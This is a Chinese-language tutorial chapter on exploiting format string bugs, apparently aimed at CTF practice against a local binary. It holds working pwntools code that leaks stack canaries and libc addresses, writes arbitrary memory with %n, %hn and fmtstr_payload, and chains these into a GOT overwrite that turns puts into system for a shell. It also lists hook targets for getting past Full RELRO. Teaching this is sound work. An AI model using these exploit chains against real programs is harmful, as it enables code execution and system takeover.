# 第 15 章 泄露与任意地址写

> 上一章我们理解了原理，这一章把它武器化：用格式化字符串读出 Canary 和 libc 地址，用 `%n` 改写 GOT 表。

---

## 15.1 用 %p 泄露敏感数据

### 15.1.1 泄露 Canary

Canary 在栈帧里的位置相对固定，通常在输入缓冲区之后。用 `%N$p` 遍历找到它：

```python
from pwn import *

p = process('./fmt_vuln')

# 一次性打印前 30 个参数
p.sendlineafter(b'Input: ', b'|'.join([b'%' + str(i).encode() + b'$p' for i in range(1, 31)]))
output = p.recvline().strip().split(b'|')

# Canary 的特征：最高字节通常是 0x00（8 字节），值看起来很随机
for i, val in enumerate(output, 1):
    try:
        v = int(val, 16)
        # 64 位 Canary：值在 0x0000_xxxx_xxxx_xxxx 范围内（最高 2 字节为 0）
        if v > 0x1000 and v < 0xffffffffffff and (v >> 56) == 0:
            print(f'Possible Canary at offset {i}: {hex(v)}')
    except:
        pass
```

找到偏移量后，精确泄露：

```python
p.sendlineafter(b'Input: ', b'%11$p')   # 假设偏移量是 11
canary = int(p.recvline().strip(), 16)
log.success(f'Canary: {hex(canary)}')
```

### 15.1.2 用 %s 读取任意地址

`%N$s` 会把第 N 个参数当作指针，打印它指向的字符串。

要读取**任意地址**的内容，需要把目标地址放到栈上，让它成为 printf 的某个参数：

```python
# 假设输入缓冲区在栈上的偏移量是 6（即输入的内容从第 6 个参数开始）
target_addr = 0x404018    # 比如 puts@got 的地址

payload = p64(target_addr) + b'%6$s'
# 效果：printf 的第 6 个参数是我们写入的 target_addr
# %6$s 会打印 target_addr 指向的内容（GOT 表项的值）
```

发送这个 payload 后，程序会打印出 `puts@got` 里的 8 字节内容（puts 的真实地址）。注意如果地址里有 `\x00` 导致截断，可以把地址放在 payload 末尾。

### 15.1.3 泄露 libc 基址

结合 `%s` 和 GOT 表：

```python
# 1. 用 %s 泄露 puts@got
payload = p64(elf.got['puts']) + b'%6$s'
p.sendlineafter(b'Input: ', payload)
leak = p.recvline().strip()[:6]    # 取前 6 字节
puts_addr = u64(leak.ljust(8, b'\x00'))

# 2. 计算 libc 基址
libc_base = puts_addr - libc.sym['puts']
log.success(f'libc base: {hex(libc_base)}')
```

## 15.2 用 %n 实现任意地址写

### 15.2.1 %n 的工作原理

`%n` 会把「当前已输出的字符数」写入对应参数指向的地址：

```c
int x;
printf("AAAA%n", &x);    // 输出 4 个 A，然后 x = 4
printf("%100c%n", 'A', &x);  // 输出 100 个字符，然后 x = 100
```

`%hn`（half）写入 2 字节，`%hhn`（half of half）写入 1 字节。写入的宽度很关键：

| 格式符 | 写入大小 | 典型用途 |
| --- | --- | --- |
| `%n` | 4 字节 | 32 位任意写 |
| `%hn` | 2 字节 | 64 位下分两次写（低 2 字节 + 高 2 字节） |
| `%hhn` | 1 字节 | 最精细的写入，输出量最小 |
| `%ln` | 8 字节 | 64 位完整写（需要输出非常多字符，不常用） |

### 15.2.2 构造任意写

假设：

- 输入缓冲区的偏移量是 6（即 payload 的开头是 printf 的第 6 个参数）
- 要写到的地址是 `target_addr`
- 要写入的值是 `value`

payload 结构：

```text
[ p64(target_addr) ][ 格式符部分 ]
  ↑                   ↑
  第 6 个参数          %6$hn 等，指向第 6 个参数（即 target_addr）
```

```python
# 想把 target_addr 的低 2 字节改成 value
payload = p64(target_addr) + b'%6$hn'
```

但这样写入的值取决于前面输出的字符数（`p64(target_addr)` 有 8 字节，但地址里可能有不可打印字符，printf 会照常输出它们）。要精确控制写入的值，用 `%Nc` 来输出指定数量的字符：

```python
value = 0x1234

# 输出 value 个字符，然后用 %hn 写入
payload = p64(target_addr) + b'%' + str(value - 8).encode() + b'c%6$hn'
# 解释：p64(target_addr) 输出了 8 个字符（地址字节本身）
# 再输出 (value - 8) 个字符，总输出 = value
# %6$hn 把 value 写入 target_addr 的低 2 字节
```

> ⚠️ **注意**：`%Nc` 会输出 N 个字符（N 很大时可能超时或被截断），所以 64 位地址通常分两次 `%hn` 写低 2 字节和高 2 字节，每次值不超过 65535。

### 15.2.3 64 位地址的处理

64 位地址有 8 字节，但 `%hn` 一次只能写 2 字节。要写完整的 8 字节地址（比如把 GOT 表项改成 system 的地址），需要分 4 次写：

```text
地址: 0x00007f1234567890
      ^^   ^^   ^^   ^^
      高4  低4   高2  低2（每 2 字节一次）
```

或者用 pwntools 自动处理。

## 15.3 fmtstr_payload：一键生成任意写

pwntools 的 `fmtstr_payload` 会自动计算偏移、构造格式符、分次写入：

```python
from pwn import *

# 参数：
#   offset: 输入缓冲区在 printf 参数中的位置
#   writes: 字典 {地址: 要写入的值}
#   numbwritten: 已经在格式字符串前面输出的字符数（默认 0）

payload = fmtstr_payload(6, {elf.got['puts']: system_addr})
```

它会生成类似这样的 payload：

```text
[ 目标地址 1 ][ 目标地址 2 ][ 填充 ][ %6$hn ][ %7$hn ]
```

并精确计算每个 `%c` 的宽度，使输出字符数正好等于目标值。

### 15.3.1 一个完整的任意写例子

把 `puts@got` 改成 `system` 的地址，让下次 `puts("...")` 变成 `system("...")`：

```python
from pwn import *

context.log_level = 'info'
elf = ELF('./fmt_vuln')
libc = ELF('./libc.so.6')

p = process(elf.path)

# ====== 第一阶段：泄露 libc ======
payload = p64(elf.got['puts']) + b'%6$s'
p.sendlineafter(b'Input: ', payload)
leak = p.recvline().strip()[:6]
puts_addr = u64(leak.ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
log.success(f'system: {hex(system_addr)}')

# ====== 第二阶段：覆写 puts@got ======
payload = fmtstr_payload(6, {elf.got['puts']: system_addr})
p.sendlineafter(b'Input: ', payload)

# ====== 第三阶段：触发 system("/bin/sh") ======
# 程序下次调用 puts(something) 时，实际执行 system(something)
# 如果 something 是 "/bin/sh"，就 getshell
p.sendlineafter(b'Input: ', b'/bin/sh')
p.interactive()
```

> ⚠️ **注意**：这个例子假设程序在覆写 GOT 后会再次调用 `puts`，并且调用时的参数可控。实际题目中需要根据程序的逻辑来调整。

## 15.4 格式化字符串的其他用法

### 15.4.1 泄露栈地址

栈上通常有指向栈本身的指针（比如保存的 rbp）。用 `%N$p` 找到它，就能算出栈的基址，进而定位栈上的其他数据。

### 15.4.2 改写返回地址

如果格式化字符串的偏移量允许写到栈上返回地址的位置，可以直接用 `%n` 改写返回地址。但这需要计算返回地址在栈上的精确偏移，且写入的 8 字节值可能需要多次 `%hn`。

### 15.4.3 绕过 Full RELRO

Full RELRO 下 GOT 不可写，但可以改写其他函数指针：

- `__free_hook` / `__malloc_hook`（glibc < 2.34）
- `_IO_2_1_stdout_` 的 vtable（IO_FILE 利用）
- `__exit_funcs`（exit 处理链）

这些都是格式化字符串任意写的目标。

## 15.5 常见坑

1. **地址中的空字节**：`p64(0x404018)` 包含 `\x00\x40\x40\x00...`，如果输入函数遇到 `\x00` 会截断，地址就写不进去。解决：把地址放在 payload 末尾，或者用能读原始字节的函数（read、fgets）。
2. **`%Nc` 输出过多字符**：写入大数值时输出量巨大，可能超时。用 `%hn` 分次写，或用 `%hhn` 进一步细分。
3. **偏移量算错**：`fmtstr_payload` 的 offset 参数是「输入缓冲区是第几个参数」，需要实际测量。偏移错了写的就是别的地方。
4. **PIE 开启**：GOT 地址随机，需要先泄露 PIE 基址。

## 15.6 小结

这一章我们把格式化字符串漏洞武器化：

- **`%N$p`** 泄露栈上数据（Canary、返回地址、栈指针）
- **`%N$s`** 读取任意地址的内存（比如 GOT 表 → libc 地址）
- **`%N$hn`** 实现任意地址写（分 2 字节写入）
- **`fmtstr_payload`** 自动生成任意写 payload
- 并结合 ret2libc 完成了「泄露 → 计算 → 覆写 GOT → getshell」的完整链条
